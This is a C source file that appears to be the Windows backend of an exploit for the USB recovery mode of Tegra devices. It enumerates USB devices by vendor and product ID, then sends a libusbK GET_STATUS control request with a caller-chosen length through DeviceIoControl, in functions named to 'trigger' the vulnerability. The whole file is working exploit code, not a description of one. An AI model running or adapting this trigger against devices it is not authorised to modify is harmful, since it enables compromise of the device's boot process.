#include <stdio.h>
#include <windows.h>
#include <setupapi.h>
#include <initguid.h>
#include <usbiodef.h>

#include <libusb.h>

#include "backend.h"

#define CreateDeviceFile(DevicePathStrA) \
    CreateFileA(DevicePathStrA, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL)


#define RAW_REQUEST_STRUCT_SIZE 24
#define GET_STATUS 0
#define TO_ENDPOINT 2


#define LIBUSBK_FUNCTION_CODE_GET_STATUS 0x807

#define ctl_code CTL_CODE( FILE_DEVICE_UNKNOWN, LIBUSBK_FUNCTION_CODE_GET_STATUS, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct status_t {
    unsigned int recipient;
    unsigned int index;
    unsigned int status;
};

static HANDLE get_usb_handle(DWORD VID, DWORD PID) {
  HANDLE usb_handle = NULL;

  /* Get all the devices */
  HDEVINFO hDevInfo = SetupDiGetClassDevs(&GUID_DEVINTERFACE_USB_DEVICE, NULL, NULL, DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);
  if (hDevInfo == INVALID_HANDLE_VALUE) {
    printf("Failed to get device information set\n");
    return NULL;
  }

  SP_DEVICE_INTERFACE_DATA ifaceData = { 0 };
  ifaceData.cbSize = sizeof(ifaceData);
  DWORD index = 0;

  /* Enumerates over all the devices */
  while (SetupDiEnumDeviceInterfaces(hDevInfo, NULL, &GUID_DEVINTERFACE_USB_DEVICE, index++, &ifaceData)) { 
    SP_DEVICE_INTERFACE_DETAIL_DATA *pDetail = NULL;
    DWORD detailSize = 0;

    SetupDiGetDeviceInterfaceDetail(hDevInfo, &ifaceData, NULL, 0, &detailSize, NULL); // Finding detail size

    pDetail = (SP_DEVICE_INTERFACE_DETAIL_DATA *)malloc(detailSize);
    pDetail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA);

    if (!SetupDiGetDeviceInterfaceDetail(hDevInfo, &ifaceData, pDetail, detailSize, NULL, NULL)) {
      printf("Failed to get device interface detail. Error: %li", GetLastError());
      free(pDetail);
      continue;
    }

    DWORD vid, pid;
    sscanf_s(pDetail->DevicePath, "\\\\?\\usb#vid_%04X&pid_%04X#", &vid, &pid); // grab the vid and pid of the device

    if (vid != VID || pid != PID) {
      free(pDetail);
      continue;
    }

    usb_handle = CreateFile(pDetail->DevicePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); // create a handle to the USB drive

    if (usb_handle == INVALID_HANDLE_VALUE) {
      printf("INVALID HANDLE VALUE: Error: %li\n", GetLastError());
      free(pDetail);
      continue;
    }

    break; // USB which matches VID and PID is found, so break
  }

  SetupDiDestroyDeviceInfoList(hDevInfo); // free unused resources info

  return usb_handle;
}


static int real_trigger_vulnerability(HANDLE master_handle, uint16_t length)
{
    char raw_request[RAW_REQUEST_STRUCT_SIZE] = { 0 };

    unsigned int* timeout_p = (unsigned int*)raw_request;
    *timeout_p = 1000;

    struct status_t* status_p = (struct status_t*)(raw_request + 4);
    status_p->index = GET_STATUS;
    status_p->recipient = TO_ENDPOINT;

    OVERLAPPED overlapped;

    char* buffer = malloc(length);
    memset(buffer, 0, length);

    BOOL ret = DeviceIoControl(master_handle, ctl_code, raw_request, ARRAY_LEN(raw_request), buffer, (size_t)length, NULL, &overlapped);
    free(buffer);

    // We should not succeed
    if (ret)
        return -2;
    return 0;

}

int win32_trigger_vulnerability(tegra_handle* handle, uint16_t length)
{
    libusb_device* device = libusb_get_device(handle->usb_handle);
    struct libusb_device_descriptor desc;
    if (libusb_get_device_descriptor(device, &desc) < 0)
        return -1;

    HANDLE usb_handle = get_usb_handle(desc.idVendor, desc.idProduct);
    if (!usb_handle)
        return -1;

    // gotta temporary release the interface so we can do IO
    libusb_release_interface(handle->usb_handle, 0);

    int r = real_trigger_vulnerability(usb_handle, length);

    // Should be fine to reclaim
    libusb_claim_interface(handle->usb_handle, 0);

    return r;
}